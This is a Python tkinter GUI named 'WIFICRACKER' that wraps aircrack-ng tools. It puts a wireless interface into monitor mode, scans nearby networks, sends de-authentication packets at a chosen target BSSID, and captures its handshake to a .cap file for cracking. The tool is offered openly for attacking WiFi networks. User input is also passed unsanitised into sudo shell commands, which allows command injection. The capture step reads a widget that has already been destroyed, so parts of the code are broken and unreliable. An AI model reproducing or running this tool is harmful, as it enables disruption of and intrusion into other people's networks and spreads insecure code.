import tkinter as tk
import subprocess

class wificracker(tk.Frame):
    def __init__(self, master=None):
        super().__init__(master)
        self.master.geometry("600x500")
        self.master.configure(bg="#1A1A1D")
        self.create_widgets()

    def create_widgets(self):
        self.title = tk.Label(
            self.master,
            text="WIFICRACKER",
            font=("Courier", 30),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=20,
        )
        self.title.pack()

        self.instructions = tk.Label(
            self.master,
            text="Select the WiFi interface,\nthen click Scan Networks:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.instructions.pack()

        self.interface_label = tk.Label(
            self.master,
            text="WiFi Interface:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.interface_label.pack()

        self.interface_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.interface_input.pack(pady=10)

        self.scan_button = tk.Button(
            self.master,
            text="SCAN NETWORKS",
            font=("Courier", 16),
            fg="#1A1A1D",
            bg="#8AFF33",
            activebackground="#FF5733",
            padx=20,
            pady=10,
            command=self.scan_networks,
        )
        self.scan_button.pack(pady=10)

        self.output_label = tk.Label(
            self.master,
            text="Output:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.output_label.pack()

        self.output = tk.Text(
            self.master,
            height=10,
            width=50,
            fg="#FFFFFF",
            bg="#2C2C32",
            borderwidth=2,
            font=("Courier", 14),
        )
        self.output.pack(padx=20)

    def scan_networks(self):
        interface = self.interface_input.get()
        command = f"sudo airmon-ng check kill && sudo airmon-ng start {interface} && timeout 5s sudo airodump-ng {interface}mon"
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
        )
    
        try:
            # Выводим результаты в режиме реального времени
            for line in iter(process.stdout.readline, b''):
                self.output.insert(tk.END, line.decode())
    
        except KeyboardInterrupt:
            # Обрабатываем прерывание через ctrl+c
            process.kill()
    
        finally:
            output, error = process.communicate()
            if error:
                self.output.insert(tk.END, f"Error:\n\n{error.decode()}")
            else:
                self.output.insert(tk.END, f"Output:\n\n{output.decode()}")
    
        self.instructions.destroy()
        self.interface_input.destroy()
        self.scan_button.destroy()
    
        self.instructions2 = tk.Label(
            self.master,
            text="Select the target network's MAC address, then enter the channel,\nthen click Capture below:",
            font=("Courier", 12),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.instructions2.pack()

        self.target_label = tk.Label(
            self.master,
            text="Target Network BSSID:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.target_label.pack()

        self.target_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.target_input.pack(pady=10)

        self.channel_label = tk.Label(
            self.master,
            text="WiFi Channel:",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.channel_label.pack()

        self.channel_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.channel_input.pack(pady=10)

        self.path_label = tk.Label(
            self.master,
            text="Enter a path to save the capture file (include .cap extension):",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.path_label.pack()

        self.path_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.path_input.pack(pady=10)

        self.dist_label = tk.Label(
            self.master,
            text="Enter number of de-authentication packets (-0) (default is 0):",
            font=("Courier", 14),
            fg="#8AFF33",
            bg="#1A1A1D",
            pady=10,
        )
        self.dist_label.pack()

        self.dist_input = tk.Entry(
            self.master,
            width=40,
            borderwidth=2,
            fg="#FFFFFF",
            bg="#2C2C32",
            font=("Courier", 14),
        )
        self.dist_input.pack(pady=10)

        self.capture_button = tk.Button(
            self.master,
            text="CAPTURE",
            font=("Courier", 16),
            fg="#1A1A1D",
            bg="#8AFF33",
            activebackground="#FF5733",
            padx=20,
            pady=10,
            command=self.capture,
        )
        self.capture_button.pack(pady=10)

    def capture(self):
        interface = self.interface_input.get()
        bssid = self.target_input.get()
        channel = self.channel_input.get()
        path = self.path_input.get()
        dist = self.dist_input.get()

        if not dist:
            dist = "0"

        command = f"sudo airodump-ng {interface} --bssid {bssid} -c {channel} -w {path} | sudo aireplay-ng -0 {dist} -a {bssid} {interface}"
        process = subprocess.Popen(
            ["/bin/bash", "-c", command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=False,
        )
        output, error = process.communicate()
        if error:
            self.output.insert(tk.END, f"Error:\n\n{error.decode()}")
        else:
            self.output.insert(tk.END, f"Output:\n\n{output.decode()}")
        
root = tk.Tk()
root.title("WIFICRACKER")
app = wificracker(master=root)
app.mainloop()

